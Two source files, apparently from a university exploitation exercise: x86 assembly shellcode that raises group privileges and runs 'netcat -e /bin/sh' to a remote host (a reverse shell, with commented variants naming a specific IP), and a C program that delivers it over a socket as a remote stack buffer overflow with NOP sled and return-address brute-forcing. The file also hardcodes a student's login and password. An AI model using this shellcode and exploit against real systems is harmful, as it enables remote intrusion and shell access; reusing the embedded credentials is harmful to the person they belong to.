----------Shellcode.s--------
#	.file	"expl1b.c"
#	.section	.rodata
#	.align 4

#.data

#.text
#	.globl main
#	.type	main, @function

#create nops
#.rept 370
#     nop
#.endr

.data

.text
	.globl main
	.type main, @function
#.global getegid

main:
getegid:
	subl	%eax, %eax		#clear eax
	movb	$50, %al		#system call 50, getegid
	int		$0x80			

setregid:
	movl	%eax, %ebx		#set the groupid's
	movl 	%eax, %ecx 		#set the groupid's
	subl	%eax, %eax		#clear eax
	movb	$71, %al
	int		$0x80			#system call 71, setregid

jump:
	jmp		stringy			#need to jump to the 'call'

after_jump:

hello_world:
	sub		%eax, %eax
	sub		%ebx, %ebx
	sub		%edx, %edx
	movb	$4, %al
	movb 	$1, %bl
	mov		(%esp), %ecx
	movb	$10, %dl
	int 	$0x80	

execve_prepare:
	movl	(%esp), %ebx
	sub 	%eax, %eax		#clear eax
	sub		%ecx, %ecx		#clear ecx
	sub		%edx, %edx		#clear edx
	movb	$11, %al

	jmp after_string		#jump to after the string

add_zero:
	mov		(%esp), %edx	#move the address of the end of the string into edx
	mov		%ebx, %esi		#source pointer
	mov		%edx, %edi		#destination pointer
	#ebx and esi contain beginning, edx and edi the end of the string
	#actually edx is the byte after the call after the end of the string- oh well

	#ebx points to the start of the string, it is increased every loop
	#esi points to the start of the string, constant
	#edx points to the beginning of every new argument, changed sometimes
	#edi points to the end of the string, constant

	#eax is the current byte
	#ecx is empty
	sub		%ecx, %ecx

	#add the start of the string to the array
	mov		%ebx, (%edx)
	addb	$4,	%dl

add_zero_loop:
	cmp		%ebx, %edi		#see how far the loop has progressed		
	je		terminate_array	#if the whole string has been looped over, jump
	
	mov		(%ebx), %eax	#load the current word, but compare only the first byte
	cmp 	$0x90, %al 		#look for nops
	je 		really_add_zero	#if equal, replace byte with 0x00
	addb	$1, %bl			#increase pointer
	jmp		add_zero_loop	#if bytes not equal, loop again	

really_add_zero:
	movb 	%cl, (%ebx)		#add terminating zero
	addb	$1, %bl			#b++
	
	mov 	%ebx, (%edx)	#add start of string to array
	addb	$4, %dl			#

	jmp		add_zero_loop	#look at next char

terminate_array:
	mov 	%ecx, (%edx)	#add zero to terminate array

#do a loop that replaces 0xff with 0x00
#construct the array as defined below

do_execive:
	sub 	%eax, %eax
	movb	$11, %al		#eax: call code 11
	mov		%esi, %ebx		#ebx: filename
	mov		%edi, %ecx		#ecx: argv
	sub		%edx, %edx		#edx: envp, here empty
	int		$0x80			#system call 11, execve	string

	subl	%eax, %eax		#clear eax
	subl	%ebx, %ebx		#clear ebx
	movb	$1, %al
	int 	$0x80			#system call 1, exit

stringy:
	call 	after_jump		#jump back so that the string is in the %esp
#	.string	"/home/uebungen/dazur/dazur009/grad"
#	.string "/bin/grad"
#	.string "/bin/netcat -e /bin/sh 128.130.60.30 3333"
#	.string "/bin/netcat -e /bin/sh yourhost 3333"
	.string "/bin/sh"
	.string "-c"
#	.string "/bin/netcat -e /bin/sh localhost 3333"
	.string "/bin/netcat -e /bin/sh bandit 3333"
after_string:
	call add_zero

#array: 4byte *programm name, 4byte *element1, 4byte *element2, 4byte 0x00
----------Exploit.c----------
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>


#define NOP 0x90
//#define DEFAULT_ADDRESS 0xaaaaaaaa//0x11111111//0xbffffb60
#define MAX_FILE_SIZE 300
#define USER_PW "dazur009  :ohngeepa:"

unsigned long get_sp(void) {
   __asm__("movl %esp,%eax");
}

int main(int argc, char **argv){
	int buffer_size = 512;
//	int jmp_address = 0xbffff7ff;
	int jmp_address = 0xbfffffff;
	int nop_size = 100;
	int server_port = 10000;
	char *server_name = "127.0.0.1";
	char *shellcode_file = "shellcode.bin";

	int ja_search_repeat = 1;
	int ja_search_step = 0;
	
	int i;
	for(i = 1; i < argc; i++){
		if(strcmp(argv[i], "--help")==0){
			printf("Exploit parameters:\n");
			printf("-bs Buffer size: Default %i\n-ja Jump address: Default 0x%lx\n-ns Nop size: Default %i\n-sp Server port: Default %i\n-sn Server name: Default %s\n-sf Shellcode file: Default %s\n-jasr Jump address search repeat: Default %i\n-jass Jump address search step: Default %i\n", buffer_size, jmp_address, nop_size, server_port, server_name, shellcode_file, ja_search_repeat, ja_search_step);
			exit(0);
		}else {
			char *arg = argv[i];
			i++;
			if(i>=argc)break;

			if(strcmp(arg, "-bs")==0){
				buffer_size = atoi(argv[i]);
			}else if(strcmp(arg, "-ja")==0){
				jmp_address = atoi(argv[i]);
			}else if(strcmp(arg, "-ns")==0){
				nop_size = atoi(argv[i]);
			}else if(strcmp(arg, "-sp")==0){
				server_port = atoi(argv[i]);
			}else if(strcmp(arg, "-sn")==0){
				server_name = argv[i];
			}else if(strcmp(arg, "-sf")==0){
				shellcode_file = argv[i];
			}else if(strcmp(arg, "-jasr")==0){
				ja_search_repeat = atoi(argv[i]);
			}else if(strcmp(arg, "-jass")==0){
				ja_search_step = atoi(argv[i]);
			}
		}
	}

	printf("Buffer size: 			%i\n", buffer_size);
	printf("Jump Address: 			%x\n", jmp_address);
	printf("Nop size: 			%i\n", nop_size);
	printf("Server Port:			%i\n", server_port);
	printf("Server Name:	 		%s\n", server_name);
	printf("Exploit File:			%s\n", shellcode_file);
	printf("Jump-A search repeat		%i\n", ja_search_repeat);
	printf("Jump-A search step		%i\n", ja_search_step);

	char buff[buffer_size];
	long *addr_ptr;	

	int jmp_addr_count = 0;
	int subtract_step = 0;

	int file;
	int fsize;
	unsigned char file_buffer[MAX_FILE_SIZE];
	
	file = open(shellcode_file, O_RDONLY);
	if(file){
		fsize = read(file, file_buffer, MAX_FILE_SIZE);
	}else{
		printf("Error opening file\n");
		exit(0);
	}
	close(file);
	printf("Exploit code size is		%i\n", fsize);
	if(fsize+nop_size>buffer_size){
		error("Not enough space in buffer for shellcode and nops\n");
	}
	printf("Adding %i return addresses\n", (buffer_size-fsize-nop_size)/4);
	
	addr_ptr = (long *) buff;
	char logindata[] = "dazur009  :ohngeepa:";
	int repetition;
	for(repetition=0; repetition < ja_search_repeat; repetition++){
		printf("----------Loop number %i----------\n", repetition);
		//printf("Buffer is: %s\n", buff);
		//write the assummed address of the shellcode nop-sledge into the buffer
		jmp_addr_count = 0;
  		for (i = 0; i < buffer_size/4; i++){
	    	jmp_addr_count += 1;
			//*(addr_ptr++) = addr;
			addr_ptr[i] = jmp_address;
		}	
		//printf("Buffer is: %s\n", buff);
		//printf("Jump addresses added:		%i\n", jmp_addr_count);
		printf("Jump address used: 		0x%lx\n", jmp_address);
		jmp_address -= ja_search_step;

		//fill the beginning of the buffer with a nop-sledge
	  	for (i = 0; i < nop_size; i++){
    		buff[i] = NOP;
		}

		//write the shellcode into the buffer
		//replace any termianting zeros with a nop instruction
	  	for (i = nop_size; i < nop_size+fsize; i++){
			if(file_buffer[i-nop_size]==0){
				buff[i] = NOP;
			}else{
    			buff[i] = file_buffer[i-nop_size];
			}
		}
	
		//add login data
		strncpy(buff, logindata, strlen(logindata));
		//terminate array
		buff[buffer_size - 1] = '\0';

			
		struct hostent		*he; 
		struct sockaddr_in	server;
		int					sockfd;
	
		sockfd = socket(AF_INET, SOCK_STREAM, 0);

		he = gethostbyname(server_name);	
		printf("Copy\n");
		//memcpy(&server.sin_addr, he->h_addr_list[0], he->h_length);
		server.sin_addr.s_addr	= inet_addr(server_name);
		printf("Done\n");
		server.sin_family = AF_INET;
		server.sin_port = htons (server_port);
		printf("connecting to socket\n");
		if (connect(sockfd, (struct sockaddr *)&server, sizeof(server)) < 0)
			error("ERROR connecting\n");

		printf("Writing to socket\n");
		//printf("Writing msg: %s\n", buff);

		//---------------------
		//counting nops
		int nopcount = 0;
		int first_occurence = -1;
		printf("Buffer string length: %i\n", strlen(buff));
		for(i = 0; i < strlen(buff); i++){
			if(buff[i] & NOP){
				//found buff
				nopcount++;
				if(first_occurence==-1)first_occurence=i;				
			}
		}

		printf("Nops: %i and first nop at: %i\n", nopcount, first_occurence);

		int n = write(sockfd, buff, strlen(buff));
		char *default_buff = "dazur009  :passw   :Foobaaar";
		//write(sockfd, default_buff, strlen(default_buff));
		printf("Finished writing\n");
	}
//	printf("dazur009  :ohngeepa  :%s", buff);
  }
